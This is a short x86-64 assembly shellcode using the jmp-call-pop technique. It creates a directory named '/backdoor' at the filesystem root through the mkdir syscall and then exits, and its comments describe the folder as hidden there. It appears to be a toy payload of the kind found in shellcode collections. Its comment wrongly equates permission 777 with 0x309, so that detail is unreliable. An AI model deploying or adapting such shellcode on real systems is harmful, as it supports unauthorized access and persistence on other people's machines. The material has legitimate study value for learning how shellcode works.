section .text
        global _start
_start:
        jmp nfolder
main:
        xor rax,rax
        pop rdi
        mov rsi,0x309 ; Here we set the permission in hexadecimal, all permissions (777 => 0x309)
        add al,0x53 ; syscall 83
        syscall
 
        xor rax,rax
        add al,0x3c ; syscall 60
        syscall
nfolder:
        call main
        db "/backdoor" ; If we want to put the folder in the root directory(most hidden), neither erase the slash
